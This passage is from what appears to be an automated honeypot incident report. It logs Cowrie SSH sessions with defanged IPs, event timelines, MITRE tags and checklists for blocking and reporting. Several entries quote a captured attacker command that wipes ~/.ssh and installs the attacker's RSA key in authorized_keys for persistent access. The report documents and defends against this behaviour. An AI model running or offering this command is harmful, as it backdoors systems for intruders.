| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 11:29:06` | `cowrie.session.connect` |
| `2026-08-30 11:29:06` | `cowrie.client.version` |
| `2026-08-30 11:29:07` | `cowrie.client.kex` |
| `2026-08-30 11:29:07` | `cowrie.login.success` |
| `2026-08-30 11:29:08` | `cowrie.direct-tcpip.request` |
| `2026-08-30 11:29:08` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 11:29:08` | `cowrie.direct-tcpip.data` |
| `2026-08-30 11:29:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-261cdb57fc0e

| Field | Detail |
|---|---|
| **Source IP** | `66.116.234[.]172` |
| **First Seen** | 2026-08-30 11:29 |
| **Last Seen** | 2026-08-30 11:29 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 11:29:37` | `cowrie.session.connect` |
| `2026-08-30 11:29:37` | `cowrie.client.version` |
| `2026-08-30 11:29:38` | `cowrie.client.kex` |
| `2026-08-30 11:29:38` | `cowrie.login.success` |
| `2026-08-30 11:29:39` | `cowrie.session.params` |
| `2026-08-30 11:29:39` | `cowrie.command.input` |
| `2026-08-30 11:29:39` | `cowrie.command.failed` |
| `2026-08-30 11:29:40` | `cowrie.log.closed` |
| `2026-08-30 11:29:41` | `cowrie.session.params` |
| `2026-08-30 11:29:41` | `cowrie.command.input` |
| `2026-08-30 11:29:41` | `cowrie.session.file_download` |
| `2026-08-30 11:29:41` | `cowrie.log.closed` |
| `2026-08-30 11:29:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `66.116.234[.]172` to AbuseIPDB if not already reported
- [ ] Block `66.116.234[.]172` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89387bae247d

| Field | Detail |
|---|---|
| **Source IP** | `66.116.234[.]172` |
| **First Seen** | 2026-08-30 11:29 |
| **Last Seen** | 2026-08-30 11:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 11:29:41` | `cowrie.session.connect` |
| `2026-08-30 11:29:41` | `cowrie.client.version` |
| `2026-08-30 11:29:41` | `cowrie.client.kex` |
| `2026-08-30 11:29:42` | `cowrie.login.success` |
| `2026-08-30 11:29:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `66.116.234[.]172` to AbuseIPDB if not already reported
- [ ] Block `66.116.234[.]172` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60d75e8effed

| Field | Detail |
|---|---|
| **Source IP** | `66.116.234[.]172` |
| **First Seen** | 2026-08-30 11:29 |
| **Last Seen** | 2026-08-30 11:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 11:29:43` | `cowrie.session.connect` |
| `2026-08-30 11:29:43` | `cowrie.client.version` |
| `2026-08-30 11:29:43` | `cowrie.client.kex` |
| `2026-08-30 11:29:44` | `cowrie.login.success` |
| `2026-08-30 11:29:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `66.116.234[.]172` to AbuseIPDB if not already reported
- [ ] Block `66.116.234[.]172` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04e8ef1a60f5

| Field | Detail |
|---|---|
| **Source IP** | `94.202.13[.]224` |
| **First Seen** | 2026-08-30 11:30 |
| **Last Seen** | 2026-08-30 11:30 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 11:30:03` | `cowrie.session.connect` |
| `2026-08-30 11:30:03` | `cowrie.client.version` |
| `2026-08-30 11:30:03` | `cowrie.client.kex` |
| `2026-08-30 11:30:05` | `cowrie.login.success` |
| `2026-08-30 11:30:06` | `cowrie.direct-tcpip.request` |
| `2026-08-30 11:30:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.202.13[.]224` to AbuseIPDB if not already reported
- [ ] Block `94.202.13[.]224` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-caa6717d69ae

| Field | Detail |
|---|---|
| **Source IP** | `213.230.64[.]246` |
| **First Seen** | 2026-08-30 11:30 |
| **Last Seen** | 2026-08-30 11:30 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 11:30:11` | `cowrie.session.connect` |
| `2026-08-30 11:30:11` | `cowrie.client.version` |
| `2026-08-30 11:30:11` | `cowrie.client.kex` |
| `2026-08-30 11:30:13` | `cowrie.login.success` |
| `2026-08-30 11:30:13` | `cowrie.direct-tcpip.request` |
| `2026-08-30 11:30:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.230.64[.]246` to AbuseIPDB if not already reported
- [ ] Block `213.230.64[.]246` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe9c17a78b16

| Field | Detail |
|---|---|
| **Source IP** | `103.160.213[.]140` |
| **First Seen** | 2026-08-30 11:30 |
| **Last Seen** | 2026-08-30 11:30 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 11:30:27` | `cowrie.session.connect` |
| `2026-08-30 11:30:27` | `cowrie.client.version` |
| `2026-08-30 11:30:28` | `cowrie.client.kex` |
| `2026-08-30 11:30:29` | `cowrie.login.success` |
| `2026-08-30 11:30:30` | `cowrie.session.params` |
| `2026-08-30 11:30:30` | `cowrie.command.input` |
| `2026-08-30 11:30:30` | `cowrie.command.failed` |
| `2026-08-30 11:30:30` | `cowrie.log.closed` |
| `2026-08-30 11:30:31` | `cowrie.session.params` |
| `2026-08-30 11:30:31` | `cowrie.command.input` |
| `2026-08-30 11:30:32` | `cowrie.session.file_download` |
| `2026-08-30 11:30:32` | `cowrie.log.closed` |
| `2026-08-30 11:30:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.160.213[.]140` to AbuseIPDB if not already reported
- [ ] Block `103.160.213[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a36111bd1d1

| Field | Detail |
|---|---|
| **Source IP** | `103.160.213[.]140` |
| **First Seen** | 2026-08-30 11:30 |
| **Last Seen** | 2026-08-30 11:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 11:30:32` | `cowrie.session.connect` |
| `2026-08-30 11:30:32` | `cowrie.client.version` |
| `2026-08-30 11:30:32` | `cowrie.client.kex` |
| `2026-08-30 11:30:33` | `cowrie.login.success` |
| `2026-08-30 11:30:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.160.213[.]140` to AbuseIPDB if not already reported
- [ ] Block `103.160.213[.]140` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-900eb109bc5e

| Field | Detail |
|---|---|
| **Source IP** | `103.160.213[.]140` |
| **First Seen** | 2026-08-30 11:30 |
| **Last Seen** | 2026-08-30 11:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 11:30:34` | `cowrie.session.connect` |
| `2026-08-30 11:30:34` | `cowrie.client.version` |
| `2026-08-30 11:30:34` | `cowrie.client.kex` |
| `2026-08-30 11:30:35` | `cowrie.login.success` |
| `2026-08-30 11:30:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.160.213[.]140` to AbuseIPDB if not already reported
- [ ] Block `103.160.213[.]140` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-784e548a8a6d

| Field | Detail |
|---|---|
| **Source IP** | `159.65.2[.]17` |
| **First Seen** | 2026-08-30 11:32 |
| **Last Seen** | 2026-08-30 11:32 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 11:32:01` | `cowrie.session.connect` |
| `2026-08-30 11:32:01` | `cowrie.client.version` |
| `2026-08-30 11:32:01` | `cowrie.client.kex` |
| `2026-08-30 11:32:02` | `cowrie.login.success` |
| `2026-08-30 11:32:03` | `cowrie.session.params` |
| `2026-08-30 11:32:03` | `cowrie.command.input` |
| `2026-08-30 11:32:03` | `cowrie.command.failed` |
| `2026-08-30 11:32:04` | `cowrie.log.closed` |
| `2026-08-30 11:32:05` | `cowrie.session.params` |
| `2026-08-30 11:32:05` | `cowrie.command.input` |
| `2026-08-30 11:32:05` | `cowrie.session.file_download` |
| `2026-08-30 11:32:05` | `cowrie.log.closed` |
| `2026-08-30 11:32:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.65.2[.]17` to AbuseIPDB if not already reported
- [ ] Block `159.65.2[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5622d7173a5

| Field | Detail |
|---|---|
| **Source IP** | `159.65.2[.]17` |
| **First Seen** | 2026-08-30 11:32 |
| **Last Seen** | 2026-08-30 11:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 11:32:05` | `cowrie.session.connect` |
| `2026-08-30 11:32:05` | `cowrie.client.version` |
| `2026-08-30 11:32:05` | `cowrie.client.kex` |
| `2026-08-30 11:32:06` | `cowrie.login.success` |
| `2026-08-30 11:32:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.65.2[.]17` to AbuseIPDB if not already reported
- [ ] Block `159.65.2[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3932ee7260af

| Field | Detail |
|---|---|
| **Source IP** | `159.65.2[.]17` |
| **First Seen** | 2026-08-30 11:32 |
| **Last Seen** | 2026-08-30 11:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 11:32:07` | `cowrie.session.connect` |
| `2026-08-30 11:32:07` | `cowrie.client.version` |
| `2026-08-30 11:32:07` | `cowrie.client.kex` |
| `2026-08-30 11:32:08` | `cowrie.login.success` |
| `2026-08-30 11:32:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.65.2[.]17` to AbuseIPDB if not already reported
- [ ] Block `159.65.2[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fffad2026672

| Field | Detail |
|---|---|
| **Source IP** | `103.167.89[.]222` |
| **First Seen** | 2026-08-30 11:33 |
| **Last Seen** | 2026-08-30 11:33 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 11:33:09` | `cowrie.session.connect` |
| `2026-08-30 11:33:09` | `cowrie.client.version` |
| `2026-08-30 11:33:09` | `cowrie.client.kex` |
| `2026-08-30 11:33:10` | `cowrie.login.success` |
| `2026-08-30 11:33:11` | `cowrie.session.params` |
| `2026-08-30 11:33:11` | `cowrie.command.input` |
| `2026-08-30 11:33:11` | `cowrie.command.failed` |
| `2026-08-30 11:33:12` | `cowrie.log.closed` |
| `2026-08-30 11:33:13` | `cowrie.session.params` |
| `2026-08-30 11:33:13` | `cowrie.command.input` |
| `2026-08-30 11:33:13` | `cowrie.session.file_download` |
| `2026-08-30 11:33:13` | `cowrie.log.closed` |
| `2026-08-30 11:33:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.167.89[.]222` to AbuseIPDB if not already reported
- [ ] Block `103.167.89[.]222` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3337cea6a271

| Field | Detail |
|---|---|
| **Source IP** | `103.167.89[.]222` |
| **First Seen** | 2026-08-30 11:33 |
| **Last Seen** | 2026-08-30 11:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 11:33:13` | `cowrie.session.connect` |
| `2026-08-30 11:33:13` | `cowrie.client.version` |
| `2026-08-30 11:33:14` | `cowrie.client.kex` |
| `2026-08-30 11:33:15` | `cowrie.login.success` |
| `2026-08-30 11:33:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.167.89[.]222` to AbuseIPDB if not already reported
- [ ] Block `103.167.89[.]222` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3670bf8034ec

| Field | Detail |
|---|---|
| **Source IP** | `103.167.89[.]222` |
| **First Seen** | 2026-08-30 11:33 |
| **Last Seen** | 2026-08-30 11:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 11:33:15` | `cowrie.session.connect` |
| `2026-08-30 11:33:15` | `cowrie.client.version` |
| `2026-08-30 11:33:15` | `cowrie.client.kex` |
| `2026-08-30 11:33:16` | `cowrie.login.success` |
| `2026-08-30 11:33:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.167.89[.]222` to AbuseIPDB if not already reported
- [ ] Block `103.167.89[.]222` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac14206914f4

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-30 11:34 |
| **Last Seen** | 2026-08-30 11:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 11:34:06` | `cowrie.session.connect` |
| `2026-08-30 11:34:06` | `cowrie.client.version` |
| `2026-08-30 11:34:06` | `cowrie.client.kex` |
| `2026-08-30 11:34:07` | `cowrie.login.success` |
| `2026-08-30 11:34:07` | `cowrie.direct-tcpip.request` |
| `2026-08-30 11:34:07` | `cowrie.direct-tcpip.data` |
| `2026-08-30 11:34:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09a1f372f18f

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 11:34 |
| **Last Seen** | 2026-08-30 11:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 11:34:24` | `cowrie.session.connect` |
| `2026-08-30 11:34:24` | `cowrie.client.version` |
| `2026-08-30 11:34:24` | `cowrie.client.kex` |
| `2026-08-30 11:34:25` | `cowrie.login.success` |
| `2026-08-30 11:34:25` | `cowrie.direct-tcpip.request` |
| `2026-08-30 11:34:25` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 11:34:25` | `cowrie.direct-tcpip.data` |
| `2026-08-30 11:34:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7cffeeb41bc8

| Field | Detail |
|---|---|
| **Source IP** | `78.187.9[.]53` |
| **First Seen** | 2026-08-30 11:35 |
| **Last Seen** | 2026-08-30 11:35 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 11:35:23` | `cowrie.session.connect` |
| `2026-08-30 11:35:23` | `cowrie.client.version` |
| `2026-08-30 11:35:23` | `cowrie.client.kex` |
| `2026-08-30 11:35:24` | `cowrie.login.success` |
| `2026-08-30 11:35:25` | `cowrie.direct-tcpip.request` |
| `2026-08-30 11:35:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.187.9[.]53` to AbuseIPDB if not already reported
- [ ] Block `78.187.9[.]53` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5555aff0e2b

| Field | Detail |
|---|---|
| **Source IP** | `219.73.79[.]33` |
| **First Seen** | 2026-08-30 11:35 |
| **Last Seen** | 2026-08-30 11:35 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 11:35:30` | `cowrie.session.connect` |
| `2026-08-30 11:35:31` | `cowrie.client.version` |
| `2026-08-30 11:35:31` | `cowrie.client.kex` |
| `2026-08-30 11:35:32` | `cowrie.login.success` |
| `2026-08-30 11:35:33` | `cowrie.direct-tcpip.request` |
| `2026-08-30 11:35:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `219.73.79[.]33` to AbuseIPDB if not already reported
- [ ] Block `219.73.79[.]33` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e202bab400ad

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 11:39 |
| **Last Seen** | 2026-08-30 11:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 11:39:56` | `cowrie.session.connect` |
| `2026-08-30 11:39:56` | `cowrie.client.version` |
| `2026-08-30 11:39:57` | `cowrie.client.kex` |
| `2026-08-30 11:39:57` | `cowrie.login.success` |
| `2026-08-30 11:39:58` | `cowrie.direct-tcpip.request` |
| `2026-08-30 11:39:58` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 11:39:58` | `cowrie.direct-tcpip.data` |
| `2026-08-30 11:39:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0658e25a65c4

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 11:44 |
| **Last Seen** | 2026-08-30 11:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 11:44:06` | `cowrie.session.connect` |
| `2026-08-30 11:44:06` | `cowrie.client.version` |
| `2026-08-30 11:44:06` | `cowrie.client.kex` |
| `2026-08-30 11:44:07` | `cowrie.login.success` |
| `2026-08-30 11:44:07` | `cowrie.direct-tcpip.request` |
| `2026-08-30 11:44:07` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 11:44:07` | `cowrie.direct-tcpip.data` |
| `2026-08-30 11:44:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-649fe8743677

| Field | Detail |
|---|---|
| **Source IP** | `203.192.247[.]84` |
| **First Seen** | 2026-08-30 11:50 |
| **Last Seen** | 2026-08-30 11:50 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 11:50:17` | `cowrie.session.connect` |
| `2026-08-30 11:50:18` | `cowrie.client.version` |
| `2026-08-30 11:50:18` | `cowrie.client.kex` |
| `2026-08-30 11:50:20` | `cowrie.login.success` |
| `2026-08-30 11:50:21` | `cowrie.direct-tcpip.request` |
| `2026-08-30 11:50:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.192.247[.]84` to AbuseIPDB if not already reported
- [ ] Block `203.192.247[.]84` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1f09740460c

| Field | Detail |
|---|---|
| **Source IP** | `182.76.36[.]62` |
| **First Seen** | 2026-08-30 11:50 |
| **Last Seen** | 2026-08-30 11:50 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

